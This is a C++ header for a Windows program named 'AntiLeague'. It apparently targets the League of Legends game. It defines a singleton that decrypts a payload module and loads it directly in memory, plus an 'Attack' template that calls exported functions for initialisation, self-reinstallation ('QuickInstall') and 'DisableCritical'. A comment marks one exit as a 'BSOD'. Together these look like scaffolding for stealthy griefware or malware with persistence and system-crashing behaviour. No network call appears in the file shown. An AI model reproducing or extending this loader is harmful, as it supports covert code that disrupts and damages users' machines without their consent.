#pragma once

typedef bool (*AntiLeagueProc)();
typedef void (*QuickInstallProc)(std::string* payload, const std::string& dec_key);
typedef void (*InitProc)(std::string* _payload, std::string* payload, const std::string& dec_key);
typedef void (*DisableCriticalProc)();

class AntiLeague
{
private:
    HMEMORYMODULE hPayload;
	std::string getPayload();

    /*
        Thread safe (they're only modified by constructor in main thread)
    */
    HWND hWnd;
    HANDLE SafeShutdown;

    AntiLeague()
		: hPayload(NULL), hWnd(NULL), SafeShutdown(NULL)
	{
		HANDLE hMutex = CreateMutex(NULL, TRUE, L"AntiLeague");

		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			exit(0);
		}
	}

    ~AntiLeague()
    {
        SendMessage(hWnd, WM_QUIT, 1, NULL);
        WaitForSingleObject(SafeShutdown, INFINITE);

        MemoryFreeLibrary(hPayload);
        hPayload = NULL;
    }

	void cipher();
	void gen_dec_key();

    friend DWORD WINAPI SafeShutdown(LPVOID event);
    friend LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

public:
	static AntiLeague& getInstance()
	{
		static AntiLeague instance;
		return instance;
	}

	std::string dec_key;
	std::string payload;

	void Init();
    void LoadPayload(const std::string& payloadLocation);

    template <typename T>
    void Attack(T function, const char* name, std::string* payloadLocation)
    {
        function = (T)MemoryGetProcAddress(hPayload, name);

        if (function != NULL)
        {
            if constexpr (std::is_same_v<T, InitProc>)
            {
                function(payloadLocation, &payload, dec_key);
            }
            else if constexpr (std::is_same_v<T, QuickInstallProc>)
            {
                function(&payload, dec_key);
            }
            else if constexpr (std::is_same_v<T, AntiLeagueProc>)
            {
                if (!function())
                {
                    Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
                    Attack<AntiLeagueProc>(AntiLeagueProc(), "AntiLeague", NULL);
                }
            }
            else if constexpr (std::is_same_v<T, DisableCriticalProc>)
            {
                function();
            }
        }
        else
        {
            MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
            exit(1); //BSOD
        }
    }
};